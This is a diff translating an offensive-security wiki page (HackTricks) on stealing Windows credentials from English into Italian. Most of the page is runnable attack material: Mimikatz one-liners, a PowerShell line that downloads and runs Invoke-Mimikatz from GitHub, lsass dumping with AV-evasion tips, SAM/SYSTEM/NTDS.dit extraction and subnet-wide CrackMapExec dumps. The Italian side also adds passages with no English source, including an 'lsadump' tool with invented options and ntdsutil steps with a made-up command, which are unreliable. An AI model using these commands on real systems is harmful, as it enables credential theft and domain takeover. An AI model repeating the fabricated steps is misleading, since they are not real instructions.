@@ -1,21 +1,20 @@
-# Stealing Windows Credentials
+# Rubare le credenziali di Windows
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Credentials Mimikatz
-
+## Mimikatz per rubare le credenziali
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -29,23 +28,19 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-
-**Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
+**Trova altre funzionalità che Mimikatz può eseguire in** [**questa pagina**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
-
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
+[**Scopri qui alcune possibili protezioni per le credenziali.**](credentials-protections.md) **Queste protezioni potrebbero impedire a Mimikatz di estrarre alcune credenziali.**
 
-[**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
+## Credenziali con Meterpreter
 
-## Credentials with Meterpreter
-
-Use the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **that** I have created to **search for passwords and hashes** inside the victim.
-
+Utilizza il [**Plugin Credenziali**](https://github.com/carlospolop/MSF-Credentials) **che ho creato per cercare password e hash** all'interno della vittima.
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -62,13 +57,12 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-
-## Bypassing AV
+## Bypassare l'AV
 
 ### Procdump + Mimikatz
 
-As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
-You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
+Poiché **Procdump di** [**SysInternals**](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**è uno strumento legittimo di Microsoft**, non viene rilevato da Defender.\
+Puoi utilizzare questo strumento per **eseguire il dump del processo lsass**, **scaricare il dump** ed **estrarre** le **credenziali localmente** dal dump.
 
 {% code title="Dump lsass" %}
 ```bash
@@ -78,9 +72,7 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% endcode %}
-
-{% code title="Extract credentials from the dump" %}
+{% code title="Estrarre le credenziali dal dump" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -89,50 +81,46 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Questo processo viene eseguito automaticamente con [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead o**f the **name lsass.exe.**
+**Nota**: Alcuni **AV** possono **rilevare** come **malizioso** l'uso di **procdump.exe per eseguire il dump di lsass.exe**, questo perché rilevano la stringa **"procdump.exe" e "lsass.exe"**. Pertanto, è più **furtivo** **passare** come **argomento** il **PID** di lsass.exe a procdump **anziché** il nome lsass.exe.
 
-### Dumping lsass with **comsvcs.dll**
+### Estrarre lsass con **comsvcs.dll**
 
-A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
-It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
-Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
-Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+Una DLL chiamata **comsvcs.dll** trovata in `C:\Windows\System32` è responsabile per l'**estrazione della memoria del processo** in caso di crash. Questa DLL include una **funzione** chiamata **`MiniDumpW`**, progettata per essere invocata utilizzando `rundll32.exe`.\
+I primi due argomenti sono irrilevanti, ma il terzo è diviso in tre componenti. L'ID del processo da estrarre costituisce la prima componente, la posizione del file di dump rappresenta la seconda e la terza componente è strettamente la parola **full**. Non esistono opzioni alternative.\
+Dopo aver analizzato queste tre componenti, la DLL si impegna a creare il file di dump e a trasferire la memoria del processo specificato in questo file.\
+L'utilizzo della **comsvcs.dll** è fattibile per estrarre il processo lsass, eliminando così la necessità di caricare ed eseguire procdump. Questo metodo è descritto in dettaglio su [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
-The following command is employed for execution:
-
+Il seguente comando viene utilizzato per l'esecuzione:
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
+**Puoi automatizzare questo processo con** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+### **Dumping di lsass con Task Manager**
 
-### **Dumping lsass with Task Manager**
+1. Fai clic con il pulsante destro del mouse sulla barra delle applicazioni e fai clic su Task Manager
+2. Fai clic su Altre informazioni
+3. Cerca il processo "Local Security Authority Process" nella scheda Processi
+4. Fai clic con il pulsante destro del mouse sul processo "Local Security Authority Process" e fai clic su "Crea file di dump".
 
-1. Right click on the Task Bar and click on Task Manager
-2. Click on More details
-3. Search for "Local Security Authority Process" process in the Processes tab
-4. Right click on "Local Security Authority Process" process and click on "Create dump file".
+### Dumping di lsass con procdump
 
-### Dumping lsass with procdump
-
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
-
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) è un file binario firmato da Microsoft che fa parte della suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
+## Dumpin lsass con PPLBlade
 
-## Dumpin lsass with PPLBlade
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) è uno strumento di dumping di processi protetti che supporta l'oscuramento del dump di memoria e il trasferimento su workstation remote senza depositarlo sul disco.
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is a Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.
+**Funzionalità chiave**:
 
-**Key functionalities**:
-
-1. Bypassing PPL protection
-2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
-3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
+1. Bypass della protezione PPL
+2. Oscuramento dei file di dump di memoria per eludere i meccanismi di rilevamento basati su firme di Defender
+3. Caricamento del dump di memoria con metodi di caricamento RAW e SMB senza depositarlo sul disco (dump senza file)
 
 {% code overflow="wrap" %}
 ```bash
@@ -142,66 +130,112 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 
 ## CrackMapExec
 
-### Dump SAM hashes
-
+### Dump delle hash SAM
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
+### Dump delle credenziali LSA
 
-### Dump LSA secrets
+Per ottenere le credenziali memorizzate nel Local Security Authority (LSA) di un sistema Windows, è possibile utilizzare il tool `lsadump`. Questo strumento consente di estrarre le informazioni sensibili, come le password degli account utente, dal database LSA.
 
+#### Esecuzione del dump delle credenziali LSA
+
+1. Scaricare il tool `lsadump` da [qui](https://github.com/AlessandroZ/BeRoot/tree/master/Windows/Tools/lsadump).
+2. Eseguire il comando seguente per eseguire il dump delle credenziali LSA:
+
+```plaintext
+lsadump <opzioni>
+```
+
+#### Opzioni disponibili per il dump delle credenziali LSA
+
+- `-sam`: Esegue il dump delle credenziali SAM (Security Account Manager).
+- `-secrets`: Esegue il dump delle credenziali LSA Secrets.
+- `-cache`: Esegue il dump delle credenziali LSA Cache.
+- `-system`: Specifica il percorso del file SYSTEM da utilizzare per il dump delle credenziali LSA.
+- `-security`: Specifica il percorso del file SECURITY da utilizzare per il dump delle credenziali LSA.
+
+#### Esempio di dump delle credenziali LSA
+
+```plaintext
+lsadump -secrets
+```
+
+Questo comando eseguirà il dump delle credenziali LSA Secrets e mostrerà le informazioni sensibili, come le password degli account utente, nel terminale.
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
+### Estrarre il file NTDS.dit dal DC di destinazione
 
-### Dump the NTDS.dit from target DC
+Per ottenere le credenziali degli utenti dal controller di dominio di destinazione, è necessario estrarre il file NTDS.dit. Questo file contiene il database Active Directory, che include le informazioni sugli account degli utenti e le relative password hash.
 
+Per eseguire questa operazione, è possibile utilizzare strumenti come `ntdsutil` o `mimikatz`. Questi strumenti consentono di accedere al controller di dominio di destinazione e copiare il file NTDS.dit in un percorso accessibile.
+
+Una volta ottenuto il file NTDS.dit, è possibile utilizzare strumenti come `hashcat` o `John the Ripper` per decifrare le password hash e ottenere le credenziali degli utenti.
+
+È importante notare che l'estrazione del file NTDS.dit da un controller di dominio richiede privilegi di amministratore o accesso fisico al server. Inoltre, questa operazione potrebbe essere considerata illegale senza il consenso del proprietario del sistema.
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
+### Estrarre la cronologia delle password NTDS.dit dal DC di destinazione
 
-### Dump the NTDS.dit password history from target DC
+Per ottenere la cronologia delle password dal file NTDS.dit su un controller di dominio di destinazione, è possibile utilizzare il seguente metodo:
 
+1. Ottenere l'accesso al controller di dominio di destinazione.
+2. Eseguire il dump del file NTDS.dit utilizzando strumenti come `ntdsutil` o `mimikatz`.
+3. Analizzare il file NTDS.dit per estrarre la cronologia delle password.
+
+È importante notare che l'accesso al controller di dominio di destinazione potrebbe richiedere privilegi elevati e potrebbe essere necessario bypassare le misure di sicurezza per ottenere l'accesso. Si consiglia di utilizzare queste informazioni solo per scopi legittimi, come test di sicurezza o per scopi di amministrazione di sistema.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
+### Mostra l'attributo pwdLastSet per ciascun account NTDS.dit
 
-### Show the pwdLastSet attribute for each NTDS.dit account
+Per visualizzare l'attributo pwdLastSet per ciascun account NTDS.dit, esegui i seguenti passaggi:
 
+1. Apri un prompt dei comandi come amministratore.
+2. Esegui il comando seguente per accedere all'interfaccia di Active Directory:
+```
+ntdsutil
+```
+3. Successivamente, esegui il comando seguente per passare alla modalità "Activate Instance NTDS":
+```
+activate instance ntds
+```
+4. Infine, esegui il comando seguente per visualizzare l'attributo pwdLastSet per ciascun account NTDS.dit:
+```
+LDAP_SEARCH "(&(objectCategory=person)(objectClass=user))" pwdLastSet
+```
+
+Una volta eseguiti questi passaggi, verranno mostrati i valori dell'attributo pwdLastSet per ciascun account NTDS.dit.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
+## Rubare SAM & SYSTEM
 
-## Stealing SAM & SYSTEM
+Questi file dovrebbero essere **posizionati** in _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Ma **non puoi semplicemente copiarli in modo normale** perché sono protetti.
 
-This files should be **located** in _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ But **you cannot just copy them in a regular way** because they protected.
+### Dal Registro di sistema
 
-### From Registry
-
-The easiest way to steal those files is to get a copy from the registry:
-
+Il modo più semplice per rubare questi file è ottenere una copia dal registro di sistema:
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-
-**Download** those files to your Kali machine and **extract the hashes** using:
-
+**Scarica** quei file sulla tua macchina Kali e **estraine gli hash** utilizzando:
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
-
 ### Volume Shadow Copy
 
-You can perform copy of protected files using this service. You need to be Administrator.
+È possibile eseguire una copia dei file protetti utilizzando questo servizio. È necessario essere Amministratore.
 
-#### Using vssadmin
+#### Utilizzando vssadmin
 
-vssadmin binary is only available in Windows Server versions
-
+Il binario vssadmin è disponibile solo nelle versioni di Windows Server.
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -214,9 +248,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-
-But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** (the hard drive used is "C:" and its saved to C:\users\Public) but you can use this for copying any protected file:
-
+Ma è possibile fare lo stesso da **Powershell**. Questo è un esempio di **come copiare il file SAM** (l'unità disco rigido utilizzata è "C:" e viene salvato in C:\users\Public), ma è possibile utilizzarlo per copiare qualsiasi file protetto:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -225,130 +257,113 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-
-Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+Codice dal libro: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 
 ### Invoke-NinjaCopy
 
-Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) to make a copy of SAM, SYSTEM and ntds.dit.
-
+Infine, è possibile utilizzare lo script **Invoke-NinjaCopy** [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) per fare una copia di SAM, SYSTEM e ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
+## **Credenziali di Active Directory - NTDS.dit**
 
-## **Active Directory Credentials - NTDS.dit**
+Il file **NTDS.dit** è conosciuto come il cuore di **Active Directory**, che contiene dati cruciali sugli oggetti utente, i gruppi e le loro appartenenze. È qui che vengono memorizzati gli **hash delle password** degli utenti di dominio. Questo file è un database di **Extensible Storage Engine (ESE)** e si trova in **_%SystemRoom%/NTDS/ntds.dit_**.
 
-The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.
+All'interno di questo database, vengono mantenute tre tabelle principali:
 
-Within this database, three primary tables are maintained:
+- **Tabella dei dati**: Questa tabella è incaricata di memorizzare i dettagli sugli oggetti come utenti e gruppi.
+- **Tabella dei collegamenti**: Tiene traccia delle relazioni, come l'appartenenza ai gruppi.
+- **Tabella SD**: Qui vengono conservati i **descrittori di sicurezza** per ogni oggetto, garantendo la sicurezza e il controllo degli accessi per gli oggetti memorizzati.
 
-- **Data Table**: This table is tasked with storing details about objects like users and groups.
-- **Link Table**: It keeps track of relationships, such as group memberships.
-- **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.
+Ulteriori informazioni su questo: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+Windows utilizza _Ntdsa.dll_ per interagire con quel file ed è utilizzato da _lsass.exe_. Quindi, **parte** del file **NTDS.dit** potrebbe essere situata **all'interno della memoria di `lsass`** (è possibile trovare i dati più recentemente accessati probabilmente a causa del miglioramento delle prestazioni mediante l'utilizzo di una **cache**).
 
-Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).
+#### Decrittazione degli hash all'interno di NTDS.dit
 
-#### Decrypting the hashes inside NTDS.dit
+L'hash è cifrato 3 volte:
 
-The hash is cyphered 3 times:
+1. Decrittare la Password Encryption Key (**PEK**) utilizzando il **BOOTKEY** e **RC4**.
+2. Decrittare l'**hash** utilizzando **PEK** e **RC4**.
+3. Decrittare l'**hash** utilizzando **DES**.
 
-1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
-2. Decrypt tha **hash** using **PEK** and **RC4**.
-3. Decrypt the **hash** using **DES**.
+**PEK** ha lo **stesso valore** in **ogni controller di dominio**, ma è **cifrato** all'interno del file **NTDS.dit** utilizzando il **BOOTKEY** del **file SYSTEM del controller di dominio (che è diverso tra i controller di dominio)**. Ecco perché per ottenere le credenziali dal file NTDS.dit **è necessario avere i file NTDS.dit e SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
 
-**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+### Copiare NTDS.dit utilizzando Ntdsutil
 
-### Copying NTDS.dit using Ntdsutil
-
-Available since Windows Server 2008.
-
+Disponibile da Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
+È possibile utilizzare anche il trucco del [**volume shadow copy**](./#stealing-sam-and-system) per copiare il file **ntds.dit**. Ricorda che avrai bisogno anche di una copia del file **SYSTEM** (di nuovo, [**estrailo dal registro o usa il trucco del volume shadow copy**](./#stealing-sam-and-system)).
 
-You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
+### **Estrazione degli hash da NTDS.dit**
 
-### **Extracting hashes from NTDS.dit**
-
-Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
-
+Una volta che hai **ottenuto** i file **NTDS.dit** e **SYSTEM**, puoi utilizzare strumenti come _secretsdump.py_ per **estrarre gli hash**:
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-
-You can also **extract them automatically** using a valid domain admin user:
-
+Puoi anche **estrarli automaticamente** utilizzando un utente di dominio amministratore valido:
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
+Per i file **NTDS.dit** di grandi dimensioni, si consiglia di estrarli utilizzando [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Inoltre, è possibile utilizzare il modulo **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ o **mimikatz** `lsadump::lsa /inject`
 
-Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject`
+### **Estrazione degli oggetti di dominio da NTDS.dit in un database SQLite**
 
-### **Extracting domain objects from NTDS.dit to an SQLite database**
-
-NTDS objects can be extracted to an SQLite database with [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Not only secrets are extracted but also the entire objects and their attributes for further information extraction when the raw NTDS.dit file is already retrieved.
-
+Gli oggetti NTDS possono essere estratti in un database SQLite utilizzando [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non solo vengono estratti i segreti, ma anche l'intero oggetto e i relativi attributi per ulteriori informazioni quando il file NTDS.dit grezzo è già stato recuperato.
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-
-The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
+L'alveare `SYSTEM` è opzionale ma consente la decrittazione delle informazioni segrete (hash NT e LM, credenziali supplementari come password in testo normale, chiavi di Kerberos o di trust, cronologia delle password NT e LM). Oltre ad altre informazioni, vengono estratti i seguenti dati: account utente e macchina con i loro hash, flag UAC, timestamp dell'ultimo accesso e del cambio password, descrizione degli account, nomi, UPN, SPN, gruppi e appartenenze ricorsive, albero delle unità organizzative e appartenenze, domini fidati con tipo di trust, direzione e attributi...
 
 ## Lazagne
 
-Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
-
+Scarica il file binario da [qui](https://github.com/AlessandroZ/LaZagne/releases). Puoi utilizzare questo binario per estrarre le credenziali da diversi software.
 ```
 lazagne.exe all
 ```
-
-## Other tools for extracting credentials from SAM and LSASS
+## Altri strumenti per estrarre le credenziali da SAM e LSASS
 
 ### Windows credentials Editor (WCE)
 
-This tool can be used to extract credentials from the memory. Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Questo strumento può essere utilizzato per estrarre le credenziali dalla memoria. Scaricalo da: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Extract credentials from the SAM file
-
+Estrai le credenziali dal file SAM
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
-
 ### PwDump
 
-Extract credentials from the SAM file
-
+Estrae le credenziali dal file SAM
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
 type outpwdump
 ```
-
 ### PwDump7
 
-Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) and just **execute it** and the passwords will be extracted.
+Scaricalo da: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) e semplicemente **eseguilo** e le password saranno estratte.
 
-## Defenses
+## Difese
 
-[**Learn about some credentials protections here.**](credentials-protections.md)
+[**Scopri alcune protezioni per le credenziali qui.**](credentials-protections.md)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Other ways to support HackTricks:
+Altri modi per supportare HackTricks:
 
-* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
